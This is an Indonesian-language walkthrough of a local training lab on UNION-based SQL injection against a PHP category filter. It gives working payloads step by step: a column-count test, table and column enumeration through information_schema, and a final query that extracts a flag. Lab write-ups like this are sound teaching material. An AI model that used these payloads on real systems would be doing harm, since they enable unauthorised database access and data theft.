# Lab E4 - UNION Injection dengan JS Comment Hint (Easy)

## Informasi Lab
- **Endpoint**: `/filter.php?cat=`
- **Tipe**: UNION Based Injection
- **Hint**: JS comment di source code - column hint

## Analisis

### 1. Identifikasi
```
http://localhost/e4/filter.php?cat=1
```

### 2. Lihat Source Code
```html
<script>
// Column hint: this query returns 2 columns
console.log("Debug: id, name");
</script>
```
Hint menunjukkan query mengembalikan 2 kolom.

### 3. Konfirmasi Vulnerable
```
?cat=1'
```

## Solusi

### Langkah 1 - Test UNION
```
?cat=1 UNION SELECT 1,2
```

### Langkah 2 - Enumerasi Tabel
```
?cat=1 UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()
```

### Langkah 3 - Enumerasi Kolom
```
?cat=1 UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_name='flags'
```

### Langkah 4 - Ekstrak Flag
```
?cat=-1 UNION SELECT 1,flag FROM flags
```
Gunakan `-1` agar data asli tidak tampil.

### Payload Final
```
http://localhost/e4/filter.php?cat=-1 UNION SELECT 1,flag FROM flags
```

### Flag
```
IDS{XXXXXXXXXXXXXX}
```

## Tips
- Selalu cek source HTML/JS untuk hints
- Gunakan ID negatif untuk menyembunyikan hasil query asli
